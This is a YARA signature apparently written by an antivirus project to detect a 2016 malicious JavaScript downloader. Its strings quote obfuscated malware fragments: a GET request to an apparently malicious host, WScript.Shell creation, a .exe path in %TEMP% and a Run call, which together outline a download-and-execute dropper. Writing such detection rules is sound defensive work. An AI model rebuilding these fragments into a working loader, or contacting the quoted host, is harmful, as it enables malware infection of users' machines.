rule sig_20160401_a772d50fc0850bedb8c5aa3c44614e34 {
  meta:
    description = "datamaliciousorder - file 20160401_a772d50fc0850bedb8c5aa3c44614e34.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "78920160591336975e5d7c3ee32a34e3d35ecbdaff0b6b6d755e7ceaa7c25792"

  strings:
    $s1  = "OjVh[LgVa](\"G\" + \"ET\", \"http://beatorooms.com/n2isa\", false);" fullword ascii
    $s2  = "var OujUs = function GczJeh() {return WScript[JdXaf](\"WScript\"+\".Shell\");}(), HezVl = 11;" fullword ascii
    $s3  = "function SyXnx(DbxTku, BmsVb){TqEuk = TqEuk * 1; return DbxTku - BmsVb;};" fullword ascii
    $s4  = "if (OjVh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function UorFy() {return OujUs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"13R7PpASAFxZ.ex\" + \"e\";};" fullword ascii
    $s6  = "function JsFnz(){return EjtZak + \"\";};" fullword ascii
    $s7  = "function MmgJfd() {return ((LhVl == true) && (LhVl == WxXua)) ? 1 : TqEuk;};" fullword ascii
    $s8  = "var LhVl = false;" fullword ascii
    $s9  = "function VwDju(){return 23;};" fullword ascii
    $s10 = "}while (KlMey);" fullword ascii
    $s11 = "LhVl = true; " fullword ascii
    $s12 = "WxXua = true; " fullword ascii
    $s13 = "var WxXua = false;" fullword ascii
    $s14 = "function NbIx(RjSg){OujUs[\"R\"+\"un\"](RjSg, TqEuk, TqEuk);};" fullword ascii
    $s15 = "function NgzXqb(KkCeh) {var VfSrs = (1, 2, 3, 4, 5, KkCeh); return VfSrs;};" fullword ascii
    $s16 = "var IhlIiw = false;" fullword ascii
    $s17 = "function NphHj(){return JdXaf;};" fullword ascii
    $s18 = "var FzeOs = new this[\"Date\"]();" fullword ascii
    $s19 = "return SyXnx(ApeDp, ZxKwv);" fullword ascii
    $s20 = "function YsYhj()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}